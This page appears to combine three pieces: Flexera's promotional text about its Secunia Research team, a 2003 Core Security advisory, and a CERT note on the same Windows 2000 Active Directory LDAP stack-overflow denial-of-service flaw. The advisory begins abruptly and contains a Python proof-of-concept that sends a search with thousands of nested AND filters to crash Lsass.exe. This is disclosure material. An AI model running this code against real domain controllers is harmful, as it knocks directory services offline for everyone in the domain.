How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Vendors contacted:
  - Microsoft
    . Core Notification: 2003-05-16
    . Notification acknowledged by Microsoft: 2003-05-19
    . Issue fixed in Windows 2000 Service Pack 4: 2003-06-26

Release Mode: COORDINATED RELEASE

*Vulnerability Description:*

  Active Directory, which is an essential component of the Windows 2000
  architecture, presents organizations with a directory service designed
  for distributed computing environments. Active Directory allows organizations
  to centrally manage and share information on network resources and users
  while acting as the central authority for network security.

  The directory services provided by Active Directory are based on the
  Lightweight Directory Access Protocol (LDAP) and thus Active Directory
  objects can be stored and retrieved using the LDAP protocol.

  A vulnerability in Active Directory allows an attacker to crash and force
  a reboot of any Windows 2000 Server running the Active Directory service.

  The vulnerability can be triggered when an LDAP version 3 search request
  with more than 1000 "AND" statements is sent to the server, resulting in a
  stack overflow and subsequent crash of the Lsaas.exe service.

  This in turn, will force a domain controller to stop responding, thus
  making possible a denial of service attack against it. The LDAP request
  does not need to be authenticated.

  The possibility of exploiting this vulnerability to execute arbitrary code
  on a vulnerable server has not been proved but is not discarded.

*Vulnerable Packages:*

  Windows 2000 Server with Active Directory (Service Pack 3).

*Solution/Vendor Information/Workaround:*

  This issue is fixed in Windows 2000 Service Pack 4, which can be
  donwloaded from:
  <http://www.microsoft.com/Windows2000/downloads/servicepacks/sp4/>

  Further information about the vulnerability can be obtained from
  <http://support.microsoft.com/default.aspx?kbid=319709>

*Credits:*

  This vulnerability was found by Eduardo Arias, Gabriel Becedillas, Ricardo
  Quesada and Damian Saura from Core Security Technologies during Bugweek 2003
  (March 3-7, 2003).

*Technical Description - Exploit/Concept Code:*

  A 'search request' created using LDAP version 3, constructed with more than
  1000 "AND"s, will provoke a stack overflow, making the Lsass.exe service crash
  and rebooting the machine within 30 seconds.

  To reproduce the stack overflow, you need to create a 'search request' to
  an Active Directory server. The 'search request' must search for a non existent
  machine within the Domain Controller that you've previously bind to.

  It must be composed with more than 1000 AND statements but it is supposed that
  OR, GE, LE and other binary operators will yield the same results.

  Example of a Python script that creates such a request:

------------------------------------
class ActiveDirectoryDOS( Ldap ):

     def __init__(self):
         self._s = None
         self.host = '192.168.0.1'
         self.basedn = 'dc=bugweek,dc=corelabs,dc=core-sdi,dc=com'
         self.port = 389
         self.buffer = ''
         self.msg_id = 1
         Ldap.__init__()

     def generateFilter_BinaryOp( self, filter ):
         filterBuffer = asn1.OCTETSTRING(filter[[1]](#1)).encode() + asn1.OCTETSTRING(filter[[2]](#2)).encode()
         filterBuffer = self.encapsulateHeader( filter[[0]](#0), filterBuffer )
         return filterBuffer

     def generateFilter_RecursiveBinaryOp( self, filter, numTimes):
         simpleBinOp = self.generateFilter_BinaryOp( filter )
         filterBuffer = simpleBinOp
         for cnt in range( 0, numTimes ):
             filterBuffer = self.encapsulateHeader( self.LDAP_FILTER_AND, filterBuffer + simpleBinOp )
         return filterBuffer

     def searchSub( self, filterBuffer ):

         self.bindRequest()
         self.searchRequest( filterBuffer )

     def run(self, host = '', basedn = '', name = '' ):

         # the machine must not exist
         machine_name = 'xaxax'

         filterComputerNotInDir = (Ldap.LDAP_FILTER_EQUALITY,'name',machine_name)

         # execute the anonymous query
         print 'executing query'
         filterBuffer = self.generateFilter_RecursiveBinaryOp( filterComputerNotInDir, 7000 )
         self.searchSub( filterBuffer )

## Microsoft Windows Active Directory fails to handle long LDAP requests

#### Vulnerability Note VU#594108

Original Release Date: 2003-07-17 | Last Revised: 2003-07-23

---

### Overview

A flaw has been discovered in the way that Microsoft's Active Directory service handles large LDAP requests. This flaw could result in a denial-of-service vulnerability.

### Description

| The directory services provided by Microsoft's Active Directory are based on the [Lightweight Directory Access Protocol](http://www.ietf.org/rfc/rfc3377.txt) (LDAP). Active Directory objects can be stored and retrieved using standard LDAPv3 requests. Core Security Technologies has [discovered](http://www.coresecurity.com/common/showdoc.php?idx=351&idxseccion=10) a flaw in the way the Active Directory service handles long LDAP requests.  This flaw occurs when an LDAP search request with more than 700 logical qualifiers (e.g., "AND" or "OR") is sent to the server. Exploitation of the flaw reportedly results in a stack overflow and subsequent crash of the Local Security Authority Sub-System (Lsass.exe) service. The death of the Lsass.exe process forces a shutdown of the Windows host system, resulting in a denial of service for the affected server. |
| --- |

### Impact

| Remote attackers may be able to crash the Active Directory server. This can result in a serious denial-of-service condition since the Active Directory service necessarily resides on Windows domain controllers. Unavailability of the domain controllers may affect normal operations within the domain. |

### Solution

| Microsoft has included a patch for this issue in Windows 2000 Service Pack 4. For additional information, users are encouraged to review the following Microsoft Knowledge Base Articles:[319709](http://support.microsoft.com/default.aspx?kbid=319709) - An Access Violation Occurs in Lsass Because of a Stack Overflow[260910](http://support.microsoft.com/default.aspx?scid=kb;EN-US;260910) - How to Obtain the Latest Windows 2000 Service Pack |
| --- |

| **Workarounds**Block or restrict access to the Active Directory service (port 389/tcp) from untrusted networks such as the Internet. As a general rule, the CERT/CC recommends that sites block all types of network traffic from sources that are not explicitly required for normal operation. |
